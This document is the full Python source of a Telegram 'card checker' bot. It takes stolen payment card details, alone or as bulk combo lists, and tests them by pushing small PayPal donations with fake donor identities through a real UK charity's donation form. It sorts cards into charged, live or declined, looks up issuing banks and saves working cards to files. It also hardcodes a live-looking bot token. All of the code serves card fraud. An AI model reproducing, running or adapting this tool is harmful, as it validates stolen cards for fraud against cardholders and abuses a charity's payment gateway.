import requests,re, base64, json, time, random, os, threading
from user_agent import generate_user_agent
BOT_TOKEN = "8574162513:AAFTl0hvQFaCKjynyQorpOEfKk_z1nN1YpA"
active_scans = {}
def get_bin_info(cc_num):
    bin_num = cc_num[:6]
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=8)
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'UNKNOWN').upper()
            type_ = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country = data.get('country', {}).get('name', 'UNKNOWN').upper()
            emoji = data.get('country', {}).get('emoji', '🏳️')
            currency = data.get('country', {}).get('currency', 'UNK')
            return {
                "info": f"{scheme} - {type_} - {brand}",
                "bank": bank,
                "country": f"{country} {emoji} - [{currency}]"
            }
    except:
        pass
    return {"info": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}

def generate_fake_data():
    first = random.choice(["James", "Emma", "Michael", "Sophia", "William"])
    last  = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email}

def look(cc_line):
    try:
        number, month, year, cvc = [x.strip() for x in cc_line.split("|")]
        month = month.zfill(2)
        year = year[2:] if len(year) == 4 else year
    except: return "INVALID"

    fake = generate_fake_data()
    s = requests.Session()
    user = generate_user_agent()
    
    try:
        resp = s.get("https://stockportmecfs.co.uk/donate-now/", headers={'User-Agent': user}, timeout=15)
        text = resp.text
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', text).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', text).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', text).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', text).group(1)
        access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token).decode('utf-8')).group(1)
        payload_create = {
            'give-form-id-prefix': form_prefix, 'give-form-id': form_id, 'give-form-hash': form_hash,
            'give-amount': "1.4", 'payment-mode': 'paypal-commerce', 'give_first': fake["first_name"],
            'give_last': fake["last_name"], 'give_email': fake["email"], 'give-gateway': 'paypal-commerce'
        }
        resp_create = s.post(f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order", 
                             data=payload_create, headers={'User-Agent': user}, timeout=15)
        order_id = resp_create.json()['data']['id']
        payload_confirm = {
            "payment_source": {"card": {"number": number, "expiry": f"20{year}-{month}", "security_code": cvc}}
        }
        s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source", 
               json=payload_confirm, headers={'Authorization': f"Bearer {access_token}", 'Content-Type': 'application/json'}, timeout=15)
        resp_approve = s.post(f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}", 
                              data=payload_create, headers={'User-Agent': user}, timeout=15)
        
        res_text = resp_approve.text.lower()
        if any(x in res_text for x in ['thank', 'thanks', 'true']): return "CHARGED"
        if 'insufficient_funds' in res_text: return "INSUFFICIENT_FUNDS"
        return "DECLINED"
    except: return "ERROR"
def send_telegram(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp
    except Exception as e:
        print(f"Send error: {e}")
        return None
def edit_telegram(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp
    except Exception as e:
        print(f"Edit error: {e}")
        return None
def check_single_card(chat_id, line):
    try:
        initial_msg = "<b>Gateway :</b> #PayPal_Custom ($1.4)\n<b>By :</b> َِɾαιɳ ."
        initial_buttons = {
            "inline_keyboard": [
                [{"text": f"💳 {line}", "callback_data": "card"}],
                [{"text": "📊 Status: CHECKING...", "callback_data": "status"}]
            ]
        }
        resp = send_telegram(chat_id, initial_msg, initial_buttons)        
        if not resp or resp.status_code != 200:
            send_telegram(chat_id, "<b>❌ Error sending message</b>")
            return 
        message_id = resp.json().get("result", {}).get("message_id")
        start_time = time.time()
        result = look(line)
        elapsed = time.time() - start_time
        if result == "CHARGED":
            status_text = "Charge"
            status_emoji = "🔥"
        elif result == "INSUFFICIENT_FUNDS":
            status_text = "Live "
            status_emoji = "✅"
        elif result == "DECLINED":
            status_text = "DECLINED"
            status_emoji = "❌"
        else:
            status_text = "ORDER_NOT_APPROVED"
            status_emoji = "⚠️"     
        result_msg = f"<b>Gateway :</b> #PayPal_Custom ($1.00)\n<b>By :</b> َِɾαιɳ ."
        result_buttons = {
            "inline_keyboard": [
                [{"text": f"💳 {line}", "callback_data": "card"}],
                [{"text": f"📊 Status: {status_text} {status_emoji}", "callback_data": "status"}]
            ]
        }
        edit_telegram(chat_id, message_id, result_msg, result_buttons)
        if result in ["CHARGED", "INSUFFICIENT_FUNDS"]:
            bin_data = get_bin_info(line.split('|')[0])
            status_text_full = "<b>Charged - $1 (Refund)!</b>" if result == "CHARGED" else "<b>Approved - INSUFFICIENT_FUNDS!</b>"
            resp_emoji = "<b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥</b>" if result == "CHARGED" else "<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>"
            
            msg = (
                f"<b>#PayPal_Charge ($1.4) [single] 🌟</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {resp_emoji}\n"
                f"<b>[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status_text_full}\n"
                f"<b>[ϟ] 𝐓𝐚𝐤𝐞𝐧:</b> <b>{elapsed:.2f} 𝐒.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐈𝐧𝐟𝐨:</b> <b>{bin_data['info']}</b>\n"
                f"<b>[ϟ] 𝐁𝐚𝐧𝐤:</b> <b>{bin_data['bank']}</b>\n"
                f"<b>[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{bin_data['country']}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌥] 𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f} 𝐒𝐞𝐜.</b>\n"
                f"<b>[⎇] 𝐑𝐞𝐪 𝐁𝐲:</b> <b>VIP</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌤] 𝐃𝐞𝐯 𝐛𝐲:</b> <b>ɾαιɳ - 🍀</b>"
            )
            send_telegram(chat_id, msg)
            
            if result == "CHARGED":
                with open(f"charged_{chat_id}.txt", "a") as f:
                    f.write(line + "\n")
    except Exception as e:
        print(f"Check single card error: {e}")
        send_telegram(chat_id, f"<b>❌ Error:</b> {str(e)}")

def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
    active_scans[chat_id]["stop"] = False
    active_scans[chat_id]["stats"] = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "total": len(combo_lines),
        "current": 0
    }
    active_scans[chat_id]["message_id"] = initial_message_id
    for idx, line in enumerate(combo_lines):
        if active_scans.get(chat_id, {}).get("stop"):
            final_text = f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> ɾαιɳ"
            final_buttons = {
                "inline_keyboard": [
                    [{"text": "🛑 Scan Stopped", "callback_data": "stopped"}]
                ]
            }
            edit_telegram(chat_id, initial_message_id, final_text, final_buttons)
            break     
        start_time = time.time()
        result = look(line)
        elapsed = time.time() - start_time
        stats = active_scans[chat_id]["stats"]
        stats["current"] = idx + 1    
        if result == "CHARGED":
            stats["charged"] += 1
            with open(f"charged_{chat_id}.txt", "a") as f: f.write(line + "\n")
        elif result == "INSUFFICIENT_FUNDS":
            stats["approved"] += 1
        else:
            stats["declined"] += 1
        status_msg = f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> ɾαιɳ"
        if result == "CHARGED":
            status_text = "CHARGED"
        elif result == "INSUFFICIENT_FUNDS":
            status_text = "APPROVED"
        elif result == "DECLINED":
            status_text = "DECLINED"
        else:
            status_text = "ORDER_NOT_APPROVED"  
        buttons = {
            "inline_keyboard": [
                [{"text": f"💳 {line}", "callback_data": "card"}],
                [{"text": f"📊 Status: {status_text}", "callback_data": "status"}],
                [
                    {"text": f"💰 Charged ➜ [ {stats['charged']} ]", "callback_data": "charged"},
                    {"text": f"✅ Approved ➜ [ {stats['approved']} ]", "callback_data": "approved"}
                ],
                [
                    {"text": f"❌ Declined ➜ [ {stats['declined']} ]", "callback_data": "declined"},
                    {"text": f"📂 Cards ➜ [ {stats['current']}/{stats['total']} ]", "callback_data": "cards"}
                ],
                [{"text": "🛑 STOP", "callback_data": f"stop_{chat_id}"}]
            ]
        }        
        edit_telegram(chat_id, initial_message_id, status_msg, buttons)    
        if result in ["CHARGED", "INSUFFICIENT_FUNDS"]:
            bin_data = get_bin_info(line.split('|')[0])
            status_text_full = "<b>Charged - $1 (Refund)!</b>" if result == "CHARGED" else "<b>Approved - INSUFFICIENT_FUNDS!</b>"
            resp_emoji = "<b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥</b>" if result == "CHARGED" else "<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>"    
            msg = (
                f"<b>#PayPal_Charge ($1.4) [mass] 🌟</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {resp_emoji}\n"
                f"<b>[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status_text_full}\n"
                f"<b>[ϟ] 𝐓𝐚𝐤𝐞𝐧:</b> <b>{elapsed:.2f} 𝐒.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐈𝐧𝐟𝐨:</b> <b>{bin_data['info']}</b>\n"
                f"<b>[ϟ] 𝐁𝐚𝐧𝐤:</b> <b>{bin_data['bank']}</b>\n"
                f"<b>[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{bin_data['country']}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌥] 𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f} 𝐒𝐞𝐜.</b>\n"
                f"<b>[⎇] 𝐑𝐞𝐪 𝐁𝐲:</b> <b>VIP</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌤] 𝐃𝐞𝐯 𝐛𝐲:</b> <b>ɾαιɳ - 🍀</b>"
            )
            send_telegram(chat_id, msg)
        
        time.sleep(random.uniform(10, 13))

    final_msg = (
        f"<b>🏁 Scan Finished!</b>\n\n"
        f"<b>💰 Total Charged:</b> <b>{stats['charged']}</b>\n"
        f"<b>✅ Total Approved:</b> <b>{stats['approved']}</b>\n"
        f"<b>❌ Total Declined:</b> <b>{stats['declined']}</b>"
    )
    send_telegram(chat_id, final_msg)
    
    if chat_id in active_scans: del active_scans[chat_id]

def handle_updates():
    offset = 0
    print("Bot is running...")
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
            resp = requests.get(url, timeout=40)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            
            updates = resp.json()
            
            for update in updates.get("result", []):
                offset = update["update_id"] + 1
                
                if "callback_query" in update:
                    callback = update["callback_query"]
                    chat_id = callback["message"]["chat"]["id"]
                    data = callback["data"]
                    
                    if data.startswith("stop_"):
                        if chat_id in active_scans:
                            active_scans[chat_id]["stop"] = True
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                        data={"callback_query_id": callback["id"], "text": "🛑 Stopping scan..."})
                        else:
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                        data={"callback_query_id": callback["id"], "text": "❌ No active scan"})
                    elif data == "show_gateways":
                        gateways_msg = (
                            f"<b>[ϟ] 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 🔥</b>\n"
                            f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                            f"<b>[ϟ] 𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐕𝐕 𝐂𝐮𝐬𝐭𝐨𝐦 [1$] - /pp</b>"
                        )
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                    data={"callback_query_id": callback["id"], "text": "💎 Gateways", "show_alert": False})
                        send_telegram(chat_id, gateways_msg)
                    else:
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                    data={"callback_query_id": callback["id"]})
                    continue
                
                message = update.get("message", {})
                chat_id = message.get("chat", {}).get("id")
                text = message.get("text", "")
                user = message.get("from", {})
                
                if not chat_id: continue

                if text == "/start":
                    user_name = user.get("first_name", "User")
                    username = user.get("username", "N/A")
                    user_id = user.get("id", "N/A")
                    
                    welcome_msg = (
                        f"<b>[ϟ] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟</b>\n"
                        f"<b>[ϟ] 𝐍𝐚𝐦𝐞:</b> <b>{user_name}</b>\n"
                        f"<b>[ϟ] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:</b> <b>@{username}</b>\n"
                        f"<b>[ϟ] 𝐈𝐃:</b> <b>{user_id}</b>\n\n"
                        f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                        f"<b>[ϟ] 𝐁𝐨𝐭 𝐁𝐲:</b> <b>ɾαιɳ</b>\n"
                        f"<b>[ϟ] 𝐃𝐞𝐯 𝐁𝐲:</b> <b>˛ َِɾαιɳ .</b>"
                    )                 
                    welcome_buttons = {
                        "inline_keyboard": [
                            [{"text": "💎 Gateways", "callback_data": "show_gateways"}]
                        ]
                    }
                    send_telegram(chat_id, welcome_msg, welcome_buttons)
                
                elif text.startswith("/pp"):
                    parts = text.split(maxsplit=1)
                    if len(parts) < 2:
                        send_telegram(chat_id, "<b>❌ Usage:</b> <code>/pp card|month|year|cvv</code>\n<b>Example:</b> <code>/pp 4532015112830366|12|2025|123</code>")
                    else:
                        card_data = parts[1].strip()
                        if "|" in card_data:
                            threading.Thread(target=check_single_card, args=(chat_id, card_data)).start()
                        else:
                            send_telegram(chat_id, "<b>❌ Invalid format. Use:</b> <code>card|month|year|cvv</code>")
                
                elif "document" in message:
                    doc = message["document"]
                    if doc["file_name"].endswith(".txt"):
                        file_id = doc["file_id"]
                        file_path_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
                        file_path_resp = requests.get(file_path_url).json()
                        if "result" in file_path_resp:
                            file_path = file_path_resp["result"]["file_path"]
                            file_content = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}").text
                            
                            lines = [l.strip() for l in file_content.split("\n") if "|" in l]
                            if lines:
                                if chat_id in active_scans:
                                    send_telegram(chat_id, "<b>⚠️ A scan is already running. Please stop it first.</b>")
                                else:
                                    gateway_name = "#PayPal_Custom ($1.00)"
                                    initial_msg = f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> ɾαιɳ"
                                    
                                    initial_buttons = {
                                        "inline_keyboard": [
                                            [{"text": f"💳 {lines[0]}", "callback_data": "card"}],
                                            [{"text": "📊 Status: ORDER_NOT_APPROVED", "callback_data": "status"}],
                                            [
                                                {"text": "💰 Charged ➜ [ 0 ]", "callback_data": "charged"},
                                                {"text": "✅ Approved ➜ [ 0 ]", "callback_data": "approved"}
                                            ],
                                            [
                                                {"text": "❌ Declined ➜ [ 0 ]", "callback_data": "declined"},
                                                {"text": f"📂 Cards ➜ [ 0/{len(lines)} ]", "callback_data": "cards"}
                                            ],
                                            [{"text": "🛑 STOP", "callback_data": f"stop_{chat_id}"}]
                                        ]
                                    }
                                    resp = send_telegram(chat_id, initial_msg, initial_buttons)
                                    
                                    if resp and resp.status_code == 200:
                                        message_id = resp.json().get("result", {}).get("message_id")
                                        active_scans[chat_id] = {"stop": False}
                                        thread = threading.Thread(target=start_checker, args=(chat_id, lines, gateway_name, message_id))
                                        active_scans[chat_id]["thread"] = thread
                                        thread.start()
                                    else:
                                        send_telegram(chat_id, "<b>❌ Failed to start scan.</b>")
                            else:
                                send_telegram(chat_id, "<b>❌ Invalid file format. Make sure it's a combo list.</b>")
                    else:
                        send_telegram(chat_id, "<b>❌ Please send a <code>.txt</code> file.</b>")
        except Exception as e:
            print(f"Loop Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    handle_updates()


#@XVF_S

# SIKO